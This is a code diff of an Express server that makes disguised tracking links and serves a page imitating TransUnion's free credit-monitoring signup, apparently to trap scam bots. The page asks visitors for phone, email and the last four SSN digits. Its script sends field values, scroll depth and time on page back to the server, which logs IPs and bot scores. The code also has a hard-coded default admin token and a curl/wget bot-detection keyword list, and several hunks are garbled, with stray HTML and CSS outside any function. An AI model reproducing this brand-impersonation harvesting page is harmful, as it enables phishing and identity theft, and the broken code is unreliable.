@@ -10,9 +10,7 @@ const PORT = process.env.PORT || 3000;
 const DOMAIN = process.env.DOMAIN || process.env.RAILWAY_PUBLIC_DOMAIN || 'rentnstarter.up.railway.app';
 
 // Security middleware
-app.use(helmet({
-    contentSecurityPolicy: false
-}));
+app.use(helmet());
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
@@ -52,21 +50,21 @@ function generateTrackingId() {
 function requireAuth(req, res, next) {
     const authHeader = req.headers.authorization;
     const expectedAuth = process.env.ADMIN_TOKEN || 'admin-secret-token';
-    
+
     if (!authHeader || authHeader !== 'Bearer ' + expectedAuth) {
         return res.status(401).json({ error: 'Unauthorized' });
     }
-    
+
     // Simple rate limiting
     const clientIP = getClientIP(req);
     const hour = Math.floor(Date.now() / 3600000);
     const key = clientIP + '-' + hour;
-    
+
     const requests = adminRateLimit.get(key) || 0;
     if (requests >= ADMIN_RATE_LIMIT) {
         return res.status(429).json({ error: 'Rate limit exceeded' });
     }
-    
+
     adminRateLimit.set(key, requests + 1);
     next();
 }
@@ -83,8 +81,8 @@ function getClientIP(req) {
 
 // Health check endpoint
 app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'healthy', 
+    res.json({
+        status: 'healthy',
         timestamp: new Date().toISOString(),
         uptime: process.uptime()
     });
@@ -99,10 +97,10 @@ function generateFriendlyPath() {
         'rental-inquiry', 'tenant-portal', 'rental-process', 'tenant-onboarding',
         'rental-screening', 'tenant-verify', 'rental-qualify'
     ];
-    
+
     const path = paths[Math.floor(Math.random() * paths.length)];
     const num = Math.floor(Math.random() * 999) + 1;
-    
+
     return path + '-' + num;
 }
 
@@ -112,9 +110,9 @@ app.post('/api/create-link', requireAuth, (req, res) => {
         const trackingId = generateTrackingId();
         const customPath = req.body.customPath;
         const urlType = req.body.urlType || 'friendly';
-        
+
         let friendlyPath, promoCode;
-        
+
         if (customPath) {
             friendlyPath = customPath.toLowerCase().replace(/[^a-z0-9-]/g, '-');
         } else {
@@ -136,7 +134,7 @@ app.post('/api/create-link', requireAuth, (req, res) => {
                     break;
             }
         }
-        
+
         const metadata = {
             created: new Date().toISOString(),
             description: req.body.description || 'Bot tracking link',
@@ -147,14 +145,14 @@ app.post('/api/create-link', requireAuth, (req, res) => {
             clicks: [],
             createdBy: getClientIP(req)
         };
-        
+
         trackingData.set(trackingId, metadata);
-        
+
         const protocol = req.headers['x-forwarded-proto'] || 'http';
         const host = req.headers.host || DOMAIN;
-        
+
         let mainUrl, shortUrl;
-        
+
         if (promoCode) {
             mainUrl = protocol + '://' + host + '/promo/' + promoCode;
             shortUrl = protocol + '://' + host + '/p/' + promoCode;
@@ -170,7 +168,7 @@ app.post('/api/create-link', requireAuth, (req, res) => {
             mainUrl = protocol + '://' + host + '/t/' + trackingId;
             shortUrl = protocol + '://' + host + '/s/' + trackingId.substring(0, 8);
         }
-        
+
         res.json({
             success: true,
             trackingId: trackingId,
@@ -746,15 +744,16 @@ function generateCreditMonitoringHTML(trackingId) {
 '    </script>' +
 '</body>' +
 '</html>';
-}line-height: 1.5;
+}<style>
+            line-height: 1.5;
             margin: 20px 0;
         }
-        
+
         .agreement-text a {
             color: #0066cc;
             text-decoration: underline;
         }
-        
+
         .btn-primary {
             background: #ffd500;
             color: #000;
@@ -770,34 +769,34 @@ function generateCreditMonitoringHTML(trackingId) {
             align-items: center;
             justify-content: center;
         }
-        
+
         .btn-primary:hover {
             background: #e6c000;
         }
-        
+
         .lock-icon-btn {
             margin-right: 8px;
             font-size: 16px;
         }
-        
+
         .login-link {
             text-align: center;
             margin-top: 25px;
             font-size: 14px;
             color: #666;
         }
-        
+
         .login-link a {
             color: #0066cc;
             text-decoration: underline;
         }
-        
+
         .benefits-list {
             list-style: none;
             margin: 25px 0;
             padding: 0;
         }
-        
+
         .benefits-list li {
             padding: 8px 0;
             padding-left: 28px;
@@ -806,7 +805,7 @@ function generateCreditMonitoringHTML(trackingId) {
             color: #2c2c2c;
             line-height: 1.4;
         }
-        
+
         .benefits-list li:before {
             content: "✓";
             position: absolute;
@@ -815,25 +814,25 @@ function generateCreditMonitoringHTML(trackingId) {
             font-weight: bold;
             font-size: 16px;
         }
-        
+
         .benefits-list strong {
             font-weight: 600;
         }
-        
+
         @media (max-width: 768px) {
             .main-container {
                 padding: 0 15px;
             }
-            
+
             h1 {
                 font-size: 28px;
             }
-            
+
             .phone-format {
                 flex-wrap: wrap;
             }
         }
-    </style>
+</style>
 </head>
 <body>
     <header class="header">
@@ -843,17 +842,17 @@ function generateCreditMonitoringHTML(trackingId) {
             </a>
         </div>
     </header>
-    
+
     <div class="main-container">
         <div class="progress-header">
             <div class="step-indicator">Step 1: Find Your Info</div>
             <div class="progress-bar"></div>
         </div>
-        
+
         <h1>Your FREE scores, reports & monitoring are moments away</h1>
-        
+
         <a href="#" class="info-link">Personal Info We Collect</a>
-        
+
         <div class="form-container">
             <form id="signupForm">
                 <div class="form-group">
@@ -868,12 +867,12 @@ function generateCreditMonitoringHTML(trackingId) {
                     </div>
                     <div class="helper-text">We'll send a text to this number in the next step.</div>
                 </div>
-                
+
                 <div class="form-group">
                     <label class="form-label">Email address</label>
                     <input type="email" class="form-control" id="email" required>
                 </div>
-                
+
                 <div class="form-group">
                     <div class="ssn-label">
                         <label class="form-label" style="margin: 0;">xxx - xx -</label>
@@ -881,38 +880,38 @@ function generateCreditMonitoringHTML(trackingId) {
                         <span class="lock-icon">🔒</span>
                     </div>
                 </div>
-                
+
                 <div class="helper-text" style="margin-bottom: 25px;">
                     By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit information. This will also help protect you from unauthorized access.
                 </div>
-                
+
                 <div class="info-box">
                     <h3>What You Need to Know:</h3>
                     <p>The credit scores provided are based on the VantageScore® 3.0 model. Lenders use a variety of credit scores and are likely to use a credit score different from VantageScore® 3.0 to assess your creditworthiness.</p>
                 </div>
-                
+
                 <ul class="benefits-list">
                     <li><strong>Completely free</strong> - no credit card required</li>
                     <li><strong>Daily TransUnion credit reports, scores & monitoring</strong></li>
                     <li><strong>Personalized credit health tips & tools</strong></li>
                     <li><strong>Personalized offers</strong> based on your credit profile</li>
                 </ul>
-                
+
                 <div class="agreement-text">
                     By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.'s ("TUI") <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>. I consent to receive a one-time verification text from TUI to confirm my identity and to receive text notifications for account verification, support, and transactional messages, including some credit monitoring alerts and profile updates. Message and data rates may apply. Message frequency varies. To stop text notifications, reply "STOP" to any message from us. For assistance, reply "HELP".
                 </div>
-                
+
                 <button type="submit" class="btn-primary" onclick="handleSubmit(event)">
                     <span class="lock-icon-btn">🔒</span> Get started
                 </button>
             </form>
-            
+
             <div class="login-link">
                 Already have an account? <a href="#">Log in</a>
             </div>
         </div>
     </div>
-    
+
     <script>
         // Track page load
         fetch("/api/js-track/${trackingId}", {
@@ -931,20 +930,20 @@ function generateCreditMonitoringHTML(trackingId) {
                 timestamp: new Date().toISOString()
             })
         }).catch(() => {});
-        
+
         // Auto-advance phone inputs
         document.getElementById('phone1').addEventListener('input', function(e) {
             if (e.target.value.length === 3) {
                 document.getElementById('phone2').focus();
             }
         });
-        
+
         document.getElementById('phone2').addEventListener('input', function(e) {
             if (e.target.value.length === 3) {
                 document.getElementById('phone3').focus();
             }
         });
-        
+
         // Track form field interactions
         document.querySelectorAll('input').forEach(element => {
             element.addEventListener('focus', function() {
@@ -958,7 +957,7 @@ function generateCreditMonitoringHTML(trackingId) {
                     })
                 }).catch(() => {});
             });
-            
+
             element.addEventListener('blur', function() {
                 if (this.value) {
                     fetch("/api/js-track/${trackingId}", {
@@ -974,16 +973,16 @@ function generateCreditMonitoringHTML(trackingId) {
                 }
             });
         });
-        
+
         function handleSubmit(event) {
             event.preventDefault();
-            
-            const phone = document.getElementById('phone1').value + 
-                         document.getElementById('phone2').value + 
+
+            const phone = document.getElementById('phone1').value +
+                         document.getElementById('phone2').value +
                          document.getElementById('phone3').value;
             const email = document.getElementById('email').value;
             const ssn = document.getElementById('ssn').value;
-            
+
             // Track submission attempt
             fetch("/api/js-track/${trackingId}", {
                 method: "POST",
@@ -998,13 +997,13 @@ function generateCreditMonitoringHTML(trackingId) {
                     timestamp: new Date().toISOString()
                 })
             }).catch(() => {});
-            
+
             // Validate
             if (!email || ssn.length !== 4 || phone.length !== 10) {
                 alert("Please fill in all required fields correctly.");
                 return;
             }
-            
+
             // Track successful submission
             fetch("/api/js-track/${trackingId}", {
                 method: "POST",
@@ -1015,10 +1014,10 @@ function generateCreditMonitoringHTML(trackingId) {
                     timestamp: new Date().toISOString()
                 })
             }).catch(() => {});
-            
+
             alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process.");
         }
-        
+
         // Track scroll depth
         let maxScroll = 0;
         window.addEventListener('scroll', function() {
@@ -1038,7 +1037,7 @@ function generateCreditMonitoringHTML(trackingId) {
                 }
             }
         });
-        
+
         // Track time on page
         let timeOnPage = 0;
         setInterval(() => {
@@ -1061,11 +1060,11 @@ function generateCreditMonitoringHTML(trackingId) {
 }<div class="progress-fill"></div>
             </div>
         </div>
-        
+
         <h1>Your FREE scores, reports & monitoring are moments away</h1>
-        
+
         <a href="#" class="info-link">Personal Info We Collect</a>
-        
+
         <div class="form-container">
             <form id="signupForm">
                 <div class="form-group">
@@ -1082,47 +1081,47 @@ function generateCreditMonitoringHTML(trackingId) {
                     </div>
                     <div class="helper-text">We'll send a text to this number in the next step.</div>
                 </div>
-                
+
                 <div class="form-group">
                     <label class="form-label">Email address</label>
                     <input type="email" class="form-control" id="email" required>
                 </div>
-                
+
                 <div class="form-group">
                     <label class="form-label">xxx - xx - <input type="text" class="ssn-input" id="ssn" placeholder="Last 4 digits of SSN" maxlength="4"> <span class="lock-icon">🔒</span></label>
                 </div>
-                
+
                 <div class="helper-text">
                     By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit information. This will also help protect you from unauthorized access.
                 </div>
-                
+
                 <div class="info-box">
                     <h3>What You Need to Know:</h3>
                     <p>The credit scores provided are based on the VantageScore® 3.0 model. Lenders use a variety of credit scores and are likely to use a credit score different from VantageScore® 3.0 to assess your creditworthiness.</p>
                 </div>
-                
+
                 <ul class="benefits-list">
                     <li><strong>Completely free</strong> - no credit card required</li>
                     <li><strong>Daily TransUnion credit reports, scores & monitoring</strong></li>
                     <li><strong>Personalized credit health tips & tools</strong></li>
                     <li><strong>Personalized offers</strong> based on your credit profile</li>
                 </ul>
-                
+
                 <div class="agreement-text">
                     By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.'s ("TUI") <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>. I consent to receive a one-time verification text from TUI to confirm my identity and to receive text notifications for account verification, support, and transactional messages, including some credit monitoring alerts and profile updates. Message and data rates may apply. Message frequency varies. To stop text notifications, reply "STOP" to any message from us. For assistance, reply "HELP".
                 </div>
-                
+
                 <button type="submit" class="btn-primary" onclick="handleSubmit(event)">
                     <span class="lock-icon-btn">🔒</span> Get started
                 </button>
             </form>
-            
+
             <div class="login-link">
                 Already have an account? <a href="#">Log in</a>
             </div>
         </div>
     </div>
-    
+
     <script>
         // Track page load
         fetch("/api/js-track/${trackingId}", {
@@ -1141,20 +1140,20 @@ function generateCreditMonitoringHTML(trackingId) {
                 timestamp: new Date().toISOString()
             })
         }).catch(() => {});
-        
+
         // Auto-advance phone inputs
         document.getElementById('phone1').addEventListener('input', function(e) {
             if (e.target.value.length === 3) {
                 document.getElementById('phone2').focus();
             }
         });
-        
+
         document.getElementById('phone2').addEventListener('input', function(e) {
             if (e.target.value.length === 3) {
                 document.getElementById('phone3').focus();
             }
         });
-        
+
         // Track form field interactions
         document.querySelectorAll('input').forEach(element => {
             element.addEventListener('focus', function() {
@@ -1168,7 +1167,7 @@ function generateCreditMonitoringHTML(trackingId) {
                     })
                 }).catch(() => {});
             });
-            
+
             element.addEventListener('blur', function() {
                 if (this.value) {
                     fetch("/api/js-track/${trackingId}", {
@@ -1184,16 +1183,16 @@ function generateCreditMonitoringHTML(trackingId) {
                 }
             });
         });
-        
+
         function handleSubmit(event) {
             event.preventDefault();
-            
-            const phone = document.getElementById('phone1').value + 
-                         document.getElementById('phone2').value + 
+
+            const phone = document.getElementById('phone1').value +
+                         document.getElementById('phone2').value +
                          document.getElementById('phone3').value;
             const email = document.getElementById('email').value;
             const ssn = document.getElementById('ssn').value;
-            
+
             // Track submission attempt
             fetch("/api/js-track/${trackingId}", {
                 method: "POST",
@@ -1208,17 +1207,17 @@ function generateCreditMonitoringHTML(trackingId) {
                     timestamp: new Date().toISOString()
                 })
             }).catch(() => {});
-            
+
             // Validate
             if (!email || ssn.length !== 4 || phone.length !== 10) {
                 alert("Please fill in all required fields correctly.");
                 return;
             }
-            
+
             // Update progress
             document.querySelector('.progress-fill').style.width = '66%';
             document.querySelector('.step-indicator').textContent = 'Step 2: Verify Your Identity';
-            
+
             // Track successful submission
             fetch("/api/js-track/${trackingId}", {
                 method: "POST",
@@ -1229,10 +1228,10 @@ function generateCreditMonitoringHTML(trackingId) {
                     timestamp: new Date().toISOString()
                 })
             }).catch(() => {});
-            
+
             alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process.");
         }
-        
+
         // Track scroll depth
         let maxScroll = 0;
         window.addEventListener('scroll', function() {
@@ -1252,7 +1251,7 @@ function generateCreditMonitoringHTML(trackingId) {
                 }
             }
         });
-        
+
         // Track time on page
         let timeOnPage = 0;
         setInterval(() => {
@@ -1277,23 +1276,23 @@ function generateCreditMonitoringHTML(trackingId) {
 // Extract tracking logic to reusable function
 function handleTracking(req, res, trackingId) {
     const clientInfo = extractClientInfo(req);
-    
+
     if (trackingData.has(trackingId)) {
         trackingData.get(trackingId).clicks.push(clientInfo);
         console.log('Bot interaction: ' + clientInfo.ip + ' - ' + clientInfo.userAgent);
     } else {
         console.log('Unknown tracking ID accessed: ' + trackingId);
     }
-    
+
     saveInteraction(trackingId, clientInfo);
-    
+
     const strategy = req.query.strategy || 'credit';
-    
+
     switch (strategy) {
         case 'redirect':
             res.redirect(req.query.target || 'https://example.com');
             break;
-            
+
         case 'pixel':
             res.set({
                 'Content-Type': 'image/png',
@@ -1304,7 +1303,7 @@ function handleTracking(req, res, trackingId) {
             const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
             res.send(pixel);
             break;
-            
+
         case 'credit':
         default:
             res.send(generateCreditMonitoringHTML(trackingId));
@@ -1326,7 +1325,7 @@ app.get('/', (req, res) => {
         createdBy: getClientIP(req)
     };
     trackingData.set(trackingId, metadata);
-    
+
     // Show the TransUnion-style page
     res.send(generateCreditMonitoringHTML(trackingId));
 });
@@ -1335,7 +1334,7 @@ app.get('/', (req, res) => {
 app.get('/offer/:friendlyPath', (req, res) => {
     const friendlyPath = req.params.friendlyPath;
     const trackingId = findTrackingIdByPath(friendlyPath);
-    
+
     if (trackingId) {
         handleTracking(req, res, trackingId);
     } else {
@@ -1346,7 +1345,7 @@ app.get('/offer/:friendlyPath', (req, res) => {
 app.get('/go/:friendlyPath', (req, res) => {
     const friendlyPath = req.params.friendlyPath;
     const trackingId = findTrackingIdByPath(friendlyPath);
-    
+
     if (trackingId) {
         handleTracking(req, res, trackingId);
     } else {
@@ -1375,11 +1374,11 @@ app.post('/api/js-track/:id', (req, res) => {
         type: 'javascript',
         data: req.body
     };
-    
+
     if (trackingData.has(trackingId)) {
         trackingData.get(trackingId).clicks.push(jsInfo);
     }
-    
+
     saveInteraction(trackingId, jsInfo);
     res.json({ success: true });
 });
@@ -1387,7 +1386,7 @@ app.post('/api/js-track/:id', (req, res) => {
 // Extract comprehensive client information
 function extractClientInfo(req) {
     const ip = getClientIP(req);
-    
+
     return {
         timestamp: new Date().toISOString(),
         ip: ip,
@@ -1414,7 +1413,7 @@ function detectBot(userAgent) {
         'python', 'curl', 'wget', 'requests', 'selenium',
         'headless', 'phantom', 'zombie', 'mechanize'
     ];
-    
+
     const ua = userAgent.toLowerCase();
     return botKeywords.some(keyword => ua.includes(keyword));
 }
@@ -1422,21 +1421,21 @@ function detectBot(userAgent) {
 // Calculate bot probability score
 function calculateBotScore(headers) {
     let score = 0;
-    
+
     if (!headers['accept-language']) score += 20;
     if (!headers['accept-encoding']) score += 15;
     if (!headers['accept']) score += 10;
-    
+
     const ua = (headers['user-agent'] || '').toLowerCase();
     if (ua.includes('python')) score += 30;
     if (ua.includes('curl')) score += 30;
     if (ua.includes('wget')) score += 30;
     if (ua === '') score += 25;
-    
+
     if (headers['accept'] && headers['accept'].includes('*/*') && !headers['accept-language']) {
         score += 15;
     }
-    
+
     return Math.min(score, 100);
 }
 
@@ -1450,10 +1449,10 @@ function saveInteraction(trackingId, clientInfo) {
         isBot: clientInfo.isBot,
         botScore: clientInfo.botScore
     };
-    
+
     const logFile = path.join(__dirname, 'interactions.log');
     const logLine = JSON.stringify(logEntry) + '\n';
-    
+
     fs.appendFile(logFile, logLine, (err) => {
         if (err) console.error('Failed to write log:', err);
     });
@@ -1462,14 +1461,14 @@ function saveInteraction(trackingId, clientInfo) {
 // Get tracking statistics
 app.get('/api/stats/:id', requireAuth, (req, res) => {
     const trackingId = req.params.id;
-    
+
     if (!trackingData.has(trackingId)) {
         return res.status(404).json({ error: 'Tracking ID not found' });
     }
-    
+
     const data = trackingData.get(trackingId);
     const clicks = data.clicks || [];
-    
+
     // Get last 50 clicks for detailed view
     const recentClicks = clicks.slice(-50).map(click => ({
         timestamp: click.timestamp,
@@ -1481,14 +1480,14 @@ app.get('/api/stats/:id', requireAuth, (req, res) => {
         botScore: click.botScore || 0,
         type: click.type || 'page_visit'
     }));
-    
+
     // Calculate top user agents
     const uaMap = {};
     clicks.forEach(click => {
         const ua = click.userAgent || 'Unknown';
         uaMap[ua] = (uaMap[ua] || 0) + 1;
     });
-    
+
     const topUserAgents = Object.entries(uaMap)
         .sort(([,a], [,b]) => b - a)
         .slice(0, 10)
@@ -1496,7 +1495,7 @@ app.get('/api/stats/:id', requireAuth, (req, res) => {
             userAgent: ua.length > 60 ? ua.substring(0, 60) + '...' : ua,
             count: count
         }));
-    
+
     res.json({
         trackingId: trackingId,
         created: data.created,
@@ -1506,7 +1505,7 @@ app.get('/api/stats/:id', requireAuth, (req, res) => {
         uniqueIPs: [...new Set(clicks.map(c => c.ip))].length,
         botClicks: clicks.filter(c => c.isBot).length,
         humanClicks: clicks.filter(c => !c.isBot).length,
-        avgBotScore: clicks.length > 0 ? 
+        avgBotScore: clicks.length > 0 ?
             Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0,
         recentClicks: recentClicks,
         topUserAgents: topUserAgents,
@@ -1521,7 +1520,7 @@ function getTopUserAgents(clicks) {
         const ua = click.userAgent || 'Unknown';
         uaMap[ua] = (uaMap[ua] || 0) + 1;
     });
-    
+
     return Object.entries(uaMap)
         .sort(([,a], [,b]) => b - a)
         .slice(0, 5)
@@ -1534,7 +1533,7 @@ function getClicksByHour(clicks) {
         const hour = new Date(click.timestamp).getHours();
         hourMap[hour] = (hourMap[hour] || 0) + 1;
     });
-    
+
     return hourMap;
 }
 
@@ -1543,7 +1542,7 @@ app.get('/api/dashboard', requireAuth, (req, res) => {
     const allStats = Array.from(trackingData.entries()).map(([id, data]) => {
         const clicks = data.clicks || [];
         const recentClicks = clicks.slice(-20);
-        
+
         return {
             trackingId: id,
             shortId: id.substring(0, 8),
@@ -1558,14 +1557,14 @@ app.get('/api/dashboard', requireAuth, (req, res) => {
             humanClicks: clicks.filter(c => !c.isBot).length,
             lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null,
             recentClicks: recentClicks,
-            avgBotScore: clicks.length > 0 ? 
+            avgBotScore: clicks.length > 0 ?
                 Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0
         };
     });
-    
+
     const totalClicks = allStats.reduce((sum, s) => sum + s.totalClicks, 0);
     const totalBots = allStats.reduce((sum, s) => sum + s.botClicks, 0);
-    
+
     res.json({
         totalLinks: allStats.length,
         totalClicks: totalClicks,
